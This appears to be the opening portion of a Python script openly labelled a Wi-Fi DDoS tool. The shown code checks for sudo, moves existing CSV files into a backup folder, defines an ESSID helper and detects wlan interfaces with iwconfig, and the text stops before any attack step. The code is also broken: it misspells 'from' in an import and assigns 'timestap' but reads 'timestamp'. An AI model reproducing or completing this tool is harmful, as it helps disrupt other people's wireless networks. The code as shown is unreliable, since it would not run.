#!/usr/bin/env python
# a simple python tool for ddos 

# imports
import subprocess
import re
import csv
import os
import time
import shutil
form datetime import datetime

active_wireless_networks = []

def check_for_essid(essid, lst):
	check_status = True

	if len(lst) == 0:
		return check_status

	for item in lst:

		if essid in item["ESSID"]:
			check_status = False

	return check_status

print(r"WIFI DDOS")

if not 'SUDO_UID' in os.environ.keys():
	print("run this tool with sudo")
	exit()

for file_name in os.listdir():
	if ".csv" in file_name:
		print("There shouldn't be any .csv files in your directory")
		directory = os.getcwd()
		try:
			os.mkdir(directory + "/backup")
		except:
			print("Back up folder exists.")

		timestap = datetime.now()

		shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())